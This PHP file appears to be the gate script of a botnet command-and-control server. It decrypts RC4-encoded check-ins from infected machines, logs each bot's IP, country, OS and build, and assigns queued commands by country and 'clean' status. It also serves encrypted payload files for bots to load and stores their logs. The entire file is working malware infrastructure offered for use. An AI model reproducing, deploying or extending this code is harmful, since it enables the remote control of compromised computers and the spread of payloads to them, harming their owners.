<?php
  
require_once('common.php');
require_once('geo/geoipcity.inc');
require_once('config.php');

define('SRV_TYPE_REPORT', '33');
define('SRV_TYPE_TASKANSWER', '34');
define('SRV_TYPE_LOADFILE', '35');
define('SRV_TYPE_LOG', '36');

function bdecodestr($data, &$id, &$type, &$raw_data)
{
	$chr = strchr($data, '|');
	$id = substr($data, 0, strlen($data) - strlen($chr));
	$data1 = substr($data, strlen($id) + 1, strlen($data) - strlen($id) - 1);
	$chr = strchr($data1, '|');
	$type = substr($data1, 0, strlen($data1) - strlen($chr));
	$raw_data = substr($data1, strlen($type) + 1, strlen($data1) - strlen($type) - 1);
}

function GetServerData()
{
	global $bot_id, $data_type, $raw_data;

    $str = file_get_contents('php://input');
    if (!$str)
    {
        debug("Error: E1");
		error404();
    }

    $str = RC4($str, $_SERVER['HTTP_HOST']);

	bdecodestr($str, $bot_id, $data_type, $raw_data);

    debug($bot_id ." | ". $data_type ." | ". strlen($raw_data));

	if (!isset($bot_id) || empty($bot_id) || !isset($data_type) || empty($data_type))
    {
        debug("Error: E2");
		error404();
    }
}

httpNoCache();

Db_Mysql::init(MYSQL_HOST, MYSQL_LOGIN, MYSQL_PASSWORD, MYSQL_DB);
$db = Db_Mysql::getInstance();
$db->query('SET NAMES "utf8" COLLATE "utf8_unicode_ci";');
$db->debug = 0;

$bot_id = $data_type = $raw_data = '';
GetServerData();
$bot_id = mysql_real_escape_string($bot_id);
$raw_data = mysql_real_escape_string($raw_data);
$cmds = "";

try
{
    if ($data_type == SRV_TYPE_REPORT)
    {
        //---------------------------------------------------------------------------------------------------------------------
        
        parse_str($raw_data, $REC);

        $ip = getIP();
        $gi = geoip_open('geo/GeoIPCity.dat', GEOIP_STANDARD);
	    $gip = GeoIP_record_by_addr($gi, $ip);
	    if (empty($gip->country_code)) $gip->country_code = 'UNKNOWN';
        $botCountry = $gip->country_code;
        $bot = array
        (
            'botName' => $bot_id,
		    'botIp' => ip2long($ip),
		    'botAccess' => strtotime('now'),
		    'botCountry' => $botCountry,
		    'botSystem' => $REC['os'],
            'botBuildId' => $REC['bid']
        );

        $bot_s = $db->query("SELECT `botId`, `botClean` FROM bots WHERE botName='$bot_id'")->fetchAssoc();
        if (!is_array($bot_s))
        {
            $bot['botClean'] = 'yes';
            $bot['botAdded'] = strtotime('now');
            $db->insert('bots', $bot);
            $botid = $db->lastInsert();
            $botClean = 'yes';
        }
        else
        {
            $db->update('bots', $bot, "botId={$bot_s['botId']}");
            $botid = $bot_s['botId'];
            $botClean = $bot_s['botClean'];
        }

        //---------------------------------------------------------------------------------------------------------------------

        $loadsData = $db->query("SELECT * FROM loads WHERE lBotId='$botid' AND lAnswer IS NULL")->fetchAllAssoc();
        if (is_array($loadsData))
        {
            foreach ($loadsData as $l)
            {
                $taskData = $db->query("SELECT * FROM tasks WHERE tId='{$l['lTaskId']}'")->fetchAssoc();
                if (is_array($taskData))
                {
                    $task = array('tFailedCount' => $taskData['tFailedCount']+1, 'tLastTime' => date('Y-m-d H:i:s', strtotime('now')));
                    $db->update('tasks', $task, "tId='{$l['lTaskId']}'");
                }
                
                $load = array('lAnswer' => "NOA", 'lFinishTime' => date('Y-m-d H:i:s', strtotime('now')));
                $db->update('loads', $load, "lId='{$l['lId']}'");
            }
        }

        //---------------------------------------------------------------------------------------------------------------------
		
		$taskData = $db->query("SELECT * FROM tasks WHERE
                (FIND_IN_SET('$botCountry', tCountry1) OR FIND_IN_SET('$botCountry', tCountry2) OR FIND_IN_SET('$botCountry', tCountry3) OR FIND_IN_SET('$botCountry', tCountry4))
                AND (tId NOT IN (SELECT lTaskId FROM loads WHERE `lBotId`='$botid')) AND (tOnlyForClean='$botClean' OR tOnlyForClean='no') AND tState='running'
                AND (((tFinishedCount+(tStartedCount-tFinishedCount-tFailedCount)*0.90) < `tCount`) OR (DATE_ADD(tLastTime, INTERVAL 2 MINUTE) < NOW()))
				AND ((tBuild LIKE '%".$REC['bid']."%') OR (tBuild LIKE '".$REC['bid']."%') OR (tBuild LIKE '".$REC['bid']."%') OR (tBuild ='ALL'))
                ORDER BY tPriority DESC, tCreateTime ASC LIMIT 1")->fetchAssoc();
        if (is_array($taskData) && (in_array($bot_id, explode(';', $taskData['tOnlyThisBots'])) || $taskData['tOnlyThisBots'] == '*'))
        {
            if (!strncmp($taskData['tCommand'], "main", 4))
                $cmds = sprintf($taskData['tCommand'], $taskData['tConfirm'] == 'yes' ? $taskData['tId'] : 0, curPageURL());
            else
                $cmds = $taskData['tCommand'];

            if ($taskData['tConfirm'] == 'yes')
            {
                $load = array('lCountry' => $botCountry, 'lTaskId' => $taskData['tId'], 'lBotId' => $botid, 'lStartTime' => date('Y-m-d H:i:s', strtotime('now')));
                $db->insert('loads', $load);
            }
            else
            {
                $task = array('tFinishedCount' => $taskData['tFinishedCount']+1, 'tLastTime' => date('Y-m-d H:i:s', strtotime('now')));
                if ($taskData['tFinishedCount']+1 >= $taskData['tCount']) $task['tState'] = "finished";
                $db->update('tasks', $task, "tId={$taskData['tId']}");

                if ($taskData['tMarkAsDirty'] == 'yes') $db->query("UPDATE bots SET botClean='no' WHERE botId='$botid'");
            }

            $task = array('tStartedCount' => $taskData['tStartedCount']+1, 'tLastTime' => date('Y-m-d H:i:s', strtotime('now')));
            $db->update('tasks', $task, "tId={$taskData['tId']}");
        }

        //---------------------------------------------------------------------------------------------------------------------
    }
    else if ($data_type == SRV_TYPE_TASKANSWER)
    {
        //---------------------------------------------------------------------------------------------------------------------

        parse_str($raw_data, $REC);
        $tid = $REC['tid'];
        $ta = $REC['ta'];

        $bot_s = $db->query("SELECT `botId` FROM bots WHERE botName='$bot_id'")->fetchAssoc();
        if (is_array($bot_s))
        {
            $taskData = $db->query("SELECT * FROM tasks WHERE tId='$tid'")->fetchAssoc();
            if (is_array($taskData))
            {
                if (!strncmp($ta, "OK", 2))
                {
                    $task = array('tFinishedCount' => $taskData['tFinishedCount']+1, 'tLastTime' => date('Y-m-d H:i:s', strtotime('now')));
                    if ($taskData['tFinishedCount']+1 >= $taskData['tCount']) $task['tState'] = "finished";
                    $db->update('tasks', $task, "tId=$tid");
                }
                else
                {
                    $task = array('tFailedCount' => $taskData['tFailedCount']+1, 'tLastTime' => date('Y-m-d H:i:s', strtotime('now')));
                    $db->update('tasks', $task, "tId=$tid");
                }

                $loadsData = $db->query("SELECT * FROM loads WHERE lBotId='{$bot_s['botId']}' AND lTaskId='{$taskData['tId']}'")->fetchAssoc();
                if (is_array($loadsData))
                {
                    $load = array('lAnswer' => $ta, 'lFinishTime' => date('Y-m-d H:i:s', strtotime('now')));
                    $db->update('loads', $load, "lId='{$loadsData['lId']}'");
                }

                if ($taskData['tMarkAsDirty'] == 'yes') $db->query("UPDATE bots SET botClean='no' WHERE botId='{$bot_s['botId']}'");
            }
        }

        //---------------------------------------------------------------------------------------------------------------------
    }
    else if ($data_type == SRV_TYPE_LOADFILE)
    {
        parse_str($raw_data, $REC);
        $fid = $REC['fid'];
		$d_s = $db->query("SELECT `fFilePath` FROM `files` WHERE `fId`='$fid'")->fetchAssoc();
        if (is_array($d_s))
        {
			@$cmds = @RC4(@file_get_contents($d_s['fFilePath']), explode('/', $d_s['fFilePath'])[2]);
        }
    }
    else if ($data_type == SRV_TYPE_LOG)
    {
        if (strlen($raw_data) > 0)
        {
            $log_a = array
            (
                "logText" => $raw_data,
                "logBotName" => $bot_id,
                "logAdded" => strtotime('now'),
                "logColor" => "green",
            );

            $db->insert('logs', $log_a);
        }
    }
    else
    {
        debug("Wrong data type". $data_type . "-". DATA_TYPE_LOG);
    }
 
    header('Status: OK');
    
	if(!empty($cmds)) debug("Cmds: ". $cmds);

    echo RC4("OK\r\n".$cmds, $bot_id);
}
catch (Exception $e)
{
	debug("Error: E3"); 
	error404();
}

?>